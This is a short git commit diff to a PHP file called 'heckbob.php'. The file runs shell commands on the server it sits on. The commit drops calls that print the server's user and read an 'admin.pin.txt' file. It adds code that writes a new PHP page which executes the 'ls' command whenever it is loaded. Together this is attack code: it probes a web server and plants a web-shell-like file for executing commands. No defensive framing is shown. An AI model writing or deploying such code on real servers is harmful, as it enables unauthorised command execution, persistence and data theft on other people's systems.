ec3982123dfedd8fe9013ec5c21e7eeee500bc43
Oluwakemi Odusanya <odus.kemi@gmail.com>
2018-03-18 15:39:59 -0400

    Update heckbob.php

--- heckbob.php
+++ heckbob.php
@@ -1,6 +1,13 @@
 <?php 
+$pagename = 'my_page1';
+
+$newFileName = './'.$pagename.".php";
+$newFileContent = '<?php echo "here we are"; echo system(ls);?>';
 echo exec('ls');
-echo exec('whoami');
-// echo exec('cat admin.pin.txt');
+if (file_put_contents($newFileName, $newFileContent) !== false) {
+    echo "File created (" . basename($newFileName) . ")";
+} else {
+    echo "Cannot create file (" . basename($newFileName) . ")";
+}
 ?>
 
